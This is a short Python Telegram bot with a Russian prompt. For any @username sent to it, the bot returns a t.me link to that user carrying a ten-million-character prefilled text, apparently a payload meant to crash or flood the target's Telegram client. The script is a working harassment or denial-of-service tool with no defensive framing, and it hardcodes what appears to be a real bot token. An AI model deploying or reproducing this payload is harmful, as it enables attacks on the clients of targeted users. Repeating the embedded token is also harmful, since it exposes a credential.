from telegram import Update
from telegram.ext import Application, MessageHandler, filters, ContextTypes

TOKEN = '8685711484:AAH6-b42wGzNxZf3Brb4pk4xH62NLKQYHjo'

async def handle(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    if text and text.startswith('@'):
        user = text.split()[0].lstrip('@')
        link = f'https://t.me/{user}?text={"A"*10000000}'
        await update.message.reply_text(link)
    else:
        await update.message.reply_text('Отправь @username')

def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle))
    app.run_polling()

if __name__ == '__main__':
    main()
